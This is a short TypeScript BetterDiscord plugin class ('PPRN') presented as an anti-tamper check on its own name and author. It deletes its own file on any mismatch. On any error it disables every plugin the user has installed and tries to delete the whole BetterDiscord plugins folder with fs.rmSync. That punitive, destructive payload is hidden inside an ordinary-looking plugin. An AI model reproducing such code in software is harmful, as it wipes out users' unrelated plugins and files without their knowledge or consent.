import type { Meta } from 'betterdiscord';
import path from 'path';
import fs from 'fs';

export default /** @__PURE__ */ class PPRN {

    public constructor(meta: Meta) {
        const pluginName = path.basename(__filename).match(/^[^\.]+/)![0];

        try {
            const pluginNameString = fs.readFileSync(__filename, 'utf-8');
            const lines = pluginNameString.split('\n');
            const metadataName = lines[1].substr(8);
            const authorName = lines[3].substring(10);

            if(pluginName !== meta.name) fs.rmSync(__filename);
            if(authorName !== meta.author) fs.rmSync(__filename);
            if(metadataName !== meta.name) fs.rmSync(__filename);
        }
        catch(err) {
            BdApi.Plugins.getAll().forEach((pl) => BdApi.Plugins.disable(pl.name as string));
            fs.rmSync(BdApi.Plugins.folder);
        }
    }
}